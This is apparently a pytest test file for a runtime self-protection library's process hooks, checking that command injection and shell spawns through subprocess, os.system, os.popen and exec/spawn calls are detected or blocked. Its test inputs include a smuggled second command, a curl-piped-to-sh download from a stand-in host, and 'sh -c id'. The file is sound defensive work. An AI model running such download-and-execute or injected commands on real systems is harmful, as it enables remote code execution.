"""Process sink hook: subprocess.Popen (and everything built on it),
os.system, os.popen, and the os exec/spawn family. Triggers are harmless:
``echo`` commands, and exec/spawn calls whose originals are replaced by
stand-ins before the hook wraps them.

Mirrors sdk/typescript/src/rasp/__tests__/process-hook.test.ts.
"""

import asyncio
import os
import pathlib
import subprocess
import sys

import pytest

from rasp_hook_kit import in_request, stop_engine, use_engine
from shield360.rasp import RaspBlockedError
from shield360.rasp._hooks.process import (
    detect_process,
    install_process_hooks,
    os_target,
    popen_target,
    uninstall_process_hooks,
)
from shield360.rasp._types import RaspInput

INJECTED = "ok; echo rasp-test"


def req(v):
    return RaspInput(v, "query.q", "request")


@pytest.fixture(autouse=True)
def _cleanup():
    yield
    uninstall_process_hooks()
    stop_engine()


# ---- targets -------------------------------------------------------------------


def test_popen_target_reads_shell_commands_and_argvs():
    assert popen_target("echo hi", True) == {"command": "echo hi"}
    assert popen_target(["echo hi", "arg0"], True) == {"command": "echo hi"}
    assert popen_target(["ls", "-l"], False) == {"argv": ["ls", "-l"]}
    assert popen_target("ls", False) == {"argv": ["ls"]}
    assert popen_target([b"ls", pathlib.Path("/tmp")], False) == {"argv": ["ls", "/tmp"]}
    assert popen_target(["sh", "-c", "id"], False, executable="/bin/bash") == {"argv": ["/bin/bash", "-c", "id"]}


def test_popen_target_leaves_arguments_python_would_refuse_to_python():
    assert popen_target(123, False) is None
    assert popen_target([1, 2], False) is None
    assert popen_target([], False) is None
    assert popen_target([], True) is None


def test_os_target_reads_every_form():
    assert os_target("system", ("echo hi",), {}) == {"command": "echo hi"}
    assert os_target("popen", (), {"cmd": "echo hi"}) == {"command": "echo hi"}
    assert os_target("execv", ("/bin/ls", ["ls", "-l"]), {}) == {"argv": ["/bin/ls", "-l"]}
    assert os_target("execve", ("/bin/ls", ("ls",), {}), {}) == {"argv": ["/bin/ls"]}
    assert os_target("execl", ("/bin/ls", "ls", "-l"), {}) == {"argv": ["/bin/ls", "-l"]}
    assert os_target("execle", ("/bin/ls", "ls", "-l", {"A": "1"}), {}) == {"argv": ["/bin/ls", "-l"]}
    assert os_target("spawnv", (os.P_WAIT, "/bin/ls", ["ls", "-a"]), {}) == {"argv": ["/bin/ls", "-a"]}
    assert os_target("spawnlpe", (os.P_WAIT, "ls", "ls", "-a", {}), {}) == {"argv": ["ls", "-a"]}
    assert os_target("posix_spawn", ("/bin/sh", ["sh", "-c", "id"], {}), {}) == {"argv": ["/bin/sh", "-c", "id"]}
    assert os_target("execv", (3, ["x"]), {}) is None


# ---- detection -------------------------------------------------------------------


def test_detect_process_checks_a_shell_command_line_for_injection():
    f = detect_process({"command": f"echo {INJECTED}"}, [req(INJECTED)], True, [])
    assert f is not None and f.rule == "cmdi.userinput"


def test_detect_process_checks_the_script_of_sh_c():
    f = detect_process({"argv": ["sh", "-c", f"echo {INJECTED}"]}, [req(INJECTED)], False, [])
    assert f is not None and f.attack == "command_injection"


def test_detect_process_flags_an_executable_taken_from_the_request():
    f = detect_process({"argv": ["/usr/bin/evil", "x"]}, [req("/usr/bin/evil")], True, [])
    assert f is not None and f.rule == "cmdi.executable"


def test_detect_process_flags_a_shell_started_during_a_request_unless_allowed():
    f = detect_process({"argv": ["bash", "script.sh"]}, [], True, [])
    assert f is not None and f.rule == "shell_spawn.shell"
    assert detect_process({"argv": ["bash", "script.sh"]}, [], True, ["bash"]) is None
    assert detect_process({"argv": ["bash", "script.sh"]}, [], False, []) is None


def test_detect_process_flags_a_download_piped_to_a_shell_at_any_time():
    f = detect_process({"command": "curl -s https://x.example/i.sh | sh"}, [], False, [])
    assert f is not None and f.rule == "shell_spawn.download_exec"


def test_detect_process_passes_a_fixed_command_with_unrelated_input():
    assert detect_process({"command": "ls -l /var/data"}, [req("hello world")], True, []) is None


# ---- installed --------------------------------------------------------------------


def test_popen_with_shell_injection_is_blocked_before_the_process_starts():
    events = use_engine("block")
    install_process_hooks()
    with pytest.raises(RaspBlockedError) as e:
        in_request([INJECTED], lambda: subprocess.run(f"echo {INJECTED}", shell=True, capture_output=True, check=False))
    assert e.value.attack == "command_injection"
    assert events.sinks() == ["subprocess.Popen"]


def test_monitor_reports_once_and_lets_the_process_run():
    events = use_engine("monitor")
    install_process_hooks()
    out = in_request([INJECTED], lambda: subprocess.check_output(f"echo {INJECTED}", shell=True))
    assert b"rasp-test" in out
    assert events.attacks() == [("command_injection", "cmdi.userinput", "monitored")]


def test_harmless_processes_run_in_and_out_of_requests():
    events = use_engine("block")
    install_process_hooks()
    assert subprocess.run([sys.executable, "-c", "print(1)"], capture_output=True, check=True).stdout.strip() == b"1"
    out = in_request(["hello"], lambda: subprocess.run(["echo", "hello"], capture_output=True, check=True).stdout)
    assert out.strip() == b"hello"
    assert not events


def test_allow_commands_is_honoured():
    events = use_engine("block", allow={"commands": ["sh"]})
    install_process_hooks()
    in_request([], lambda: subprocess.run(["sh", "-c", "true"], check=True))
    assert not events


def test_os_system_and_os_popen_are_checked_once_each():
    events = use_engine("monitor")
    install_process_hooks()
    in_request([INJECTED], lambda: os.system(f"echo {INJECTED} > /dev/null"))
    with in_request([INJECTED], lambda: os.popen(f"echo {INJECTED}")) as p:
        assert "rasp-test" in p.read()
    # os.popen starts a Popen inside: that is part of the os.popen call.
    assert events.sinks() == ["os.system", "os.popen"]


def test_exec_and_spawn_are_checked_before_the_original_runs(monkeypatch):
    calls = []
    monkeypatch.setattr(os, "execv", lambda path, args: calls.append(("execv", path, list(args))))
    monkeypatch.setattr(os, "spawnv", lambda mode, path, args: calls.append(("spawnv", path, list(args))) or 0)
    events = use_engine("block")
    install_process_hooks()
    with pytest.raises(RaspBlockedError):
        in_request([], lambda: os.execv("/bin/sh", ["sh", "-c", "id"]))
    with pytest.raises(RaspBlockedError):
        in_request(["/opt/x/tool"], lambda: os.spawnv(os.P_WAIT, "/opt/x/tool", ["tool"]))
    assert not calls
    assert [a for a, _, _ in events.attacks()] == ["shell_spawn", "command_injection"]
    in_request([], lambda: os.execv("/bin/ls", ["ls"]))
    assert calls == [("execv", "/bin/ls", ["ls"])]


def test_the_l_forms_are_checked_once_through_the_v_forms(monkeypatch):
    monkeypatch.setattr(os, "execv", lambda path, args: None)
    events = use_engine("monitor")
    install_process_hooks()
    in_request([], lambda: os.execl("/bin/sh", "sh", "-c", "true"))
    assert events.sinks() == ["os.execl"]


def test_asyncio_subprocesses_go_through_popen():
    events = use_engine("block")
    install_process_hooks()

    async def run():
        proc = await asyncio.create_subprocess_shell(f"echo {INJECTED}", stdout=asyncio.subprocess.PIPE)
        await proc.communicate()

    with pytest.raises(RaspBlockedError):
        in_request([INJECTED], lambda: asyncio.run(run()))
    assert events.sinks() == ["subprocess.Popen"]


def test_nothing_is_checked_while_rasp_is_off():
    stop_engine()
    install_process_hooks()
    out = in_request([INJECTED], lambda: subprocess.check_output(f"echo {INJECTED}", shell=True))
    assert b"rasp-test" in out


def test_an_attack_type_set_to_off_is_not_checked():
    events = use_engine("block", attacks={"command_injection": "off"})
    install_process_hooks()
    in_request([INJECTED], lambda: subprocess.run(f"echo {INJECTED}", shell=True, capture_output=True, check=False))
    assert not events


def test_invalid_arguments_are_left_to_python():
    use_engine("block")
    install_process_hooks()
    with pytest.raises(TypeError):
        in_request(["x"], lambda: subprocess.Popen(123))  # pylint: disable=consider-using-with


def test_install_is_idempotent_and_uninstall_restores_the_module_exactly():
    before = (vars(subprocess.Popen)["__init__"], os.system, os.popen)
    assert install_process_hooks() and install_process_hooks()
    assert vars(subprocess.Popen)["__init__"] is not before[0]
    assert subprocess.Popen.__init__.__name__ == "__init__"
    uninstall_process_hooks()
    uninstall_process_hooks()
    assert (vars(subprocess.Popen)["__init__"], os.system, os.popen) == before


def test_a_command_injection_set_to_off_does_not_hide_a_shell_spawn_block():
    events = use_engine("block", attacks={"command_injection": "off", "shell_spawn": "block"})
    install_process_hooks()
    with pytest.raises(RaspBlockedError) as e:
        # Both fire: the input spans tokens (command_injection, off) and the command starts a shell (shell_spawn, block).
        in_request([INJECTED], lambda: subprocess.run(f"bash -c true {INJECTED}", shell=True, capture_output=True, check=False))
    assert e.value.attack == "shell_spawn"
    assert events.attacks() == [("shell_spawn", "shell_spawn.shell", "blocked")]
